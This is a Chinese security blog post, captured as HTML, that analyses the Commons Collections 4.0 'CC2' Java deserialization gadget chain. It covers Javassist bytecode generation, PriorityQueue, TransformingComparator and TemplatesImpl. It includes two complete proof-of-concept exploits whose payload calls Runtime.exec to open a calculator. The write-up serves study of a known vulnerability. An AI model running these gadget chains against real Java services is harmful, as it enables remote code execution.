@@ -1,0 +1,508 @@
+<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CommonsCollections 2分析 | 小叹</title><meta name="keywords" content="Java"><meta name="author"><meta name="copyright"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections 2分析">
+<meta property="og:url" content="http://yoursite.com/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="小叹">
+<meta property="og:description" content="Java">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gp4m1tiui1j31hc0u07wi.jpg">
+<meta property="article:published_time" content="2021-04-01T14:16:01.000Z">
+<meta property="article:modified_time" content="2021-07-29T05:50:59.366Z">
+<meta property="article:tag" content="悦读">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008eGmZEgy1gp4m1tiui1j31hc0u07wi.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="XGwjLQtdgDNnEDwkeuCK-ucz-j3-gHvZkeARGhb9hJU"/><meta name="baidu-site-verification" content="code-n7EnZXbI9l"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CommonsCollections 2分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2021-07-29 13:50:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/talking/"><i class="fa-fw fas fa-address-book"></i><span> 闲谈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 关系</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-heart"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008eGmZEgy1gp4m1tiui1j31hc0u07wi.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">小叹</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/talking/"><i class="fa-fw fas fa-address-book"></i><span> 闲谈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 关系</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-heart"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CommonsCollections 2分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-04-01T14:16:01.000Z" title="Created 2021-04-01 22:16:01">2021-04-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-29T05:50:59.366Z" title="Updated 2021-07-29 13:50:59">2021-07-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java/">Java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CommonsCollections 2分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CommonsCollections-2分析"><a href="#CommonsCollections-2分析" class="headerlink" title="CommonsCollections 2分析"></a>CommonsCollections 2分析</h1><h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>cc2的利用和cc1不同，这里用到了一个新的类库，可以允许开发者添加新的类和方法。下面来看看javassist的API文档的描述。</p>
+<pre><code>The Javassist Core API.
+Javassist (Java programming assistant) makes bytecode engineering simple. It is a class library for editing bytecode in Java; it enables Java programs to define a new class at runtime and to modify a given class file when the JVM loads it.
+
+The most significant class of this package is CtClass. See the description of this class first.
+
+To know the version number of this package, type the following command:
+
+java -jar javassist.jar
+It prints the version number on the console.</code></pre><p>它令java中运行时可以运行一个新的类，并在JVM虚拟机中可以加载它。</p>
+<p>这里我们使用一个实例代码来更好的理解。相关方法可以翻看<a target="_blank" rel="noopener" href="https://www.javassist.org/html/javassist/package-summary.html">javassist的API文档</a>。</p>
+<pre><code class="java">import javassist.*;
+
+import java.io.IOException;
+
+public class test2 &#123;
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123;
+
+        ClassPool pool = ClassPool.getDefault(); // 返回默认类池（其实就是在默认的jvm类搜索路径中搜索）
+        CtClass person = pool.makeClass(&quot;Person&quot;); // 创建Person类
+
+        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, person);//private String name
+        name.setModifiers(Modifier.PRIVATE);
+        person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));
+
+
+        person.addMethod(CtNewMethod.getter(&quot;getName&quot;,name));
+        person.addMethod(CtNewMethod.setter(&quot;setName&quot;,name));
+
+        //创建无参构造
+        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, person);
+        person.addConstructor(constructor);
+
+        //创建有参构造
+        constructor = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;,person);
+        constructor.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);//$0 = this, $1$2$3····代表方法参数
+        person.addConstructor(constructor);
+
+        CtMethod printName = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, person);
+        printName.setModifiers(Modifier.PUBLIC);
+        printName.setBody(&quot;System.out.println(name);&quot;);
+        person.addMethod(printName);
+
+        person.writeFile(&quot;./Person&quot;);
+
+    &#125;
+&#125;</code></pre>
+<p>其中这一行不可缺少，String的值必须初始化，否则值有参构造的时候会发生报错。</p>
+<pre><code>person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));</code></pre><p>我在网上并没有搜索到原因，debug也没有跟到，我猜测应该是如果为初始化，name值不会被加载到栈中，$0.name无法搜索到。以上仅个人观点，有错见谅。上面的代码会创建一个class文件。</p>
+<pre><code class="java">public class Person &#123;
+    private String name = &quot;xiaotan&quot;;
+
+    public String getName() &#123;
+        return this.name;
+    &#125;
+
+    public void setName(String var1) &#123;
+        this.name = var1;
+    &#125;
+
+    public Person() &#123;
+    &#125;
+
+    public Person(String var1) &#123;
+        this.name = var1;
+    &#125;
+
+    public void printName() &#123;
+        System.out.println(this.name);
+    &#125;
+&#125;</code></pre>
+<p>既然已经生成了class文件，我们不可避免的会思考到，我们如何调用javassist动态创建到类呢。这里有三个方法：</p>
+<ul>
+<li>通过反射调用</li>
+<li>通过class文件调用</li>
+<li>通过接口调用</li>
+</ul>
+<h3 id="通过反射调用"><a href="#通过反射调用" class="headerlink" title="通过反射调用"></a>通过反射调用</h3><pre><code class="java">public class test2 &#123;
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;
+
+        ClassPool pool = ClassPool.getDefault(); // 返回默认类池（其实就是在默认的jvm类搜索路径中搜索）
+        CtClass person = pool.makeClass(&quot;Person&quot;); // 创建Person类
+
+        CtField name = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, person);//private String name
+        name.setModifiers(Modifier.PRIVATE);
+        person.addField(name, CtField.Initializer.constant(&quot;xiaotan&quot;));
+
+
+        person.addMethod(CtNewMethod.getter(&quot;getName&quot;,name));
+        person.addMethod(CtNewMethod.setter(&quot;setName&quot;,name));
+
+        //创建无参构造
+        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, person);
+        constructor.setBody(&quot;&#123;name = \&quot;xiaotan\&quot;;&#125;&quot;);
+        person.addConstructor(constructor);
+
+        //创建有参构造
+        constructor = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;,person);
+        constructor.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);//$0 = this, $1$2$3····代表方法参数
+        person.addConstructor(constructor);
+
+        CtMethod printName = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, person);
+        printName.setModifiers(Modifier.PUBLIC);
+        printName.setBody(&quot;System.out.println(name);&quot;);
+        person.addMethod(printName);
+
+        //person.writeFile(&quot;./Person&quot;);
+
+        Object obj = person.toClass().newInstance();
+
+        Method setName = obj.getClass().getMethod(&quot;setName&quot;, String.class);
+        setName.invoke(obj,&quot;pyshare&quot;);
+
+        Method method = obj.getClass().getMethod(&quot;printName&quot;);
+        method.invoke(obj);
+    &#125;
+&#125;</code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp2yb5rm2ij312c08e752.jpg" alt=""></p>
+<p>这里在无参构造的时候新加了一段代码，否则会报错。</p>
+<h3 id="通过-class文件调用"><a href="#通过-class文件调用" class="headerlink" title="通过.class文件调用"></a>通过.class文件调用</h3><pre><code class="java">ClassPool pool = ClassPool.getDefault();
+// 设置类路径
+pool.appendClassPath(&quot;/Users/xiaotan/Public/javacode/cc4/src/test/java&quot;);
+CtClass ctClass = pool.get(&quot;Person&quot;);
+Object person = ctClass.toClass().newInstance();
+//  ...... 下面和通过反射的方式一样去使用</code></pre>
+<h3 id="通过接口调用"><a href="#通过接口调用" class="headerlink" title="通过接口调用"></a>通过接口调用</h3><pre><code class="java">public interface PersonI &#123;
+
+    void setName(String name);
+
+    String getName();
+
+    void printName();
+
+&#125;</code></pre>
+<pre><code class="java">ClassPool pool = ClassPool.getDefault();
+pool.appendClassPath(&quot;/Users/xiaotan/Public/javacode/cc4/src/test/java&quot;);
+
+// 获取接口
+CtClass codeClassI = pool.get(&quot;PersonI&quot;);
+CtClass ctClass = pool.get(&quot;Person&quot;);
+ctClass.setInterfaces(new CtClass[]&#123;codeClassI&#125;);
+
+
+PersonI person = (PersonI)ctClass.toClass().newInstance();
+System.out.println(person.getName());
+person.setName(&quot;xiao&quot;);
+person.printName();</code></pre>
+<p>我们可以发现其实第一种和第二种方法最终都是通过反射的方法执行的。</p>
+<p>同理我们可以构造代码进行命令执行<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp36stes0lj31i80u07sg.jpg" alt=""><br>如上是通过加载字节码的方式调用的，当然也可以通过反射的方式调用，因为我们将代码以及加载进入了static中，因此我们主要将类实例化我们就可以进行命令执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp36ye630lj31g60qsh84.jpg" alt=""></p>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在ysoserial的cc2中使用了javassist和Templateslmpl（在后面的我会给出利用链，我们会发现其实利用链原理和fastjson1.2.24中相同）。但是直接看ysoserial的利用链很难理解，我们先沿用cc1的利用链，来进行命令执行，来更好的理解cc2的利用链。</p>
+<h3 id="简易版Poc1"><a href="#简易版Poc1" class="headerlink" title="简易版Poc1"></a>简易版Poc1</h3><pre><code class="java">public class Poc1 &#123;
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                        String.class, Class[].class &#125;, new Object[] &#123;
+                        &quot;getRuntime&quot;, new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                        Object.class, Object[].class &#125;, new Object[] &#123;
+                        null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;open -a Calculator&quot;&#125;)&#125;);
+
+        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        queue.add(1);
+        queue.add(2);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,comparator);
+
+        try &#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));
+            inputStream.readObject();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+&#125;</code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp44ce41rij31fl0u0kf8.jpg" alt=""></p>
+<p>我们先来看一下Poc1的利用链：</p>
+<pre><code>ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+    PriorityQueue.heapify()
+        PriorityQueue.siftDown()
+            PriorityQueue.siftDownUsingComparator()
+                TransformingComparator.compare()
+                    InvokerTransformer.transform()
+                        Method.invoke()
+            ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()</code></pre><p>我们debug进行跟入：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp476tumvcj31y80u01kx.jpg" alt=""><br>具体的利用链这里就不过多分析了，主要讲讲利用链的主要思路。</p>
+<h4 id="为什么要在queue中加入两个值？"><a href="#为什么要在queue中加入两个值？" class="headerlink" title="为什么要在queue中加入两个值？"></a>为什么要在queue中加入两个值？</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp47inzzt2j30pc07iju3.jpg" alt=""><br>和cc1相同的是，cc2也是通过触发transform来进行命令执行的。而在cc2中是通过触发TransormingComparator的compare来触发的。我们先去看看this.transformer是否可控。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp47olmzomj31eq05m75a.jpg" alt=""><br>很幸运在TransormingComparator的有参构造中，可以直接操控decorated，和transormer</p>
+<p>我们可以看见上面的POC1中又个很奇怪的地方:queue.add(1),queue.add(2)。为什么要这样写呢？因为中PriorityQueue.heapify()中会判断queue的size是否大于1，如果不是的话不会触发siftDown。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp47vlrttvj30uy06y76e.jpg" alt=""></p>
+<h4 id="为什么用的是collections4-0？"><a href="#为什么用的是collections4-0？" class="headerlink" title="为什么用的是collections4.0？"></a>为什么用的是collections4.0？</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp48d1ewtgj31e20g0wn2.jpg" alt=""></p>
+<p>因为在CC4.0中TransformingComparator继承了Serializable，而CC3.1没有。</p>
+<h3 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2"></a>Poc2</h3><p>现在我们来看看yos中利用到javassist和Templateslmpl的利用链</p>
+<h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>这里是Templateslmpl加载字节码的利用链：</p>
+<pre><code>TemplatesImpl.getOutputProperties()
+  TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+        TemplatesImpl.defineTransletClasses()
+            TransletClassLoader.defineClass()</code></pre><p>在Poc2中我们设置了几个值，这是因为在TemplatesImpl会对_name和_class判断，那_bytecodes又是如何触发的呢？我们跟入defineTransletClasses中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k1g6u0jj30zy0syjw4.jpg" alt=""></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4jh66xsaj30ro0cognf.jpg" alt=""></p>
+<p>这里会判断_name是否为null，_class是否为null。我们再回过头看看在TemplatesImpl中还有一个地方，为什么要将字节码classBytes设置成byte[][]的类型？</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k2df9sij30zc08kjtg.jpg" alt=""><br>这是因为在TemplatesImpl中，_bytecodes是byte[][]类型的，所以需要进行转换。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4k50qfggj30yc05qgmb.jpg" alt=""></p>
+<p>还有最后一点这里会判断字节码的父类是不是AbstractTranslet.class。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4kjybmb7j30xi0g0ac3.jpg" alt=""></p>
+<h4 id="为什么要设置size为2"><a href="#为什么要设置size为2" class="headerlink" title="为什么要设置size为2"></a>为什么要设置size为2</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4kracjexj30vk06odgi.jpg" alt=""><br>这里如果不设置，则无法进入siftDown。</p>
+<h3 id="为什么要用反射修改size"><a href="#为什么要用反射修改size" class="headerlink" title="为什么要用反射修改size"></a>为什么要用反射修改size</h3><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp4liashr0j31fo08idh8.jpg" alt=""></p>
+<p>我们在Poc1中是直接利用add的方法修改size但是这里我也试了一下，是无法触发的，因为如果使用add会将TemplatesImpl覆盖掉，所以需要利用反射。而为什么需要修改size上面也已经说过了，如果size不大于1是无法触发siftDown的。<br>下面是Poc2完整的代码</p>
+<pre><code class="java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+public class Poc2 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;)
+                .getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;evil&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;
+        cc.makeClassInitializer().insertBefore(cmd);
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+
+        TransformingComparator comparator = new TransformingComparator(transformer);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        Object[] queue_array = new Object[]&#123;templates,1&#125;;
+        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
+        queue_field.setAccessible(true);
+        queue_field.set(queue,queue_array);
+
+        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(queue,2);
+//        queue.add(1);
+//        queue.add(2);
+
+        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        comparator_field.setAccessible(true);
+        comparator_field.set(queue,comparator);
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));
+            inputStream.readObject();
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    &#125;
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;
+        Field field = null;
+        try &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        &#125;
+        catch (NoSuchFieldException ex) &#123;
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        return field;
+    &#125;
+&#125;</code></pre>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面是我对CC2的分析，分析的不是很仔细，只对一些关键点进行了分析，因为我觉得如果跟着利用链一步步分析有点像流水账，不如写下一些关键点，多留出思考的空间。下面想学习一下内网，可是也想学代码审计，呜呜，心还是静不下来，要努力把心静下来，好好专研技术。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://tva1.sinaimg.cn/large/008eGmZEgy1gp4m1tiui1j31hc0u07wi.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/"><img class="prev-cover" src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp924g7eqhj31o00u0dul.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CommonsCollections 3～7分析</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/26/HW%E6%80%BB%E7%BB%93/"><img class="next-cover" src="https://tva1.sinaimg.cn/large/008eGmZEly1goxaap4zwtj319n0u04c2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">HW总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/03/03/CommonsCollections 1分析/" title="CommonsCollections 1分析"><img class="cover" src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-03</div><div class="title">CommonsCollections 1分析</div></div></a></div><div><a href="/2021/05/09/Java agent学习/" title="Java agent学习"><img class="cover" src="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-09</div><div class="title">Java agent学习</div></div></a></div><div><a href="/2021/04/11/solr漏洞分析--CVE-2017-3163/" title="solr漏洞分析--CVE-2017-3163"><img class="cover" 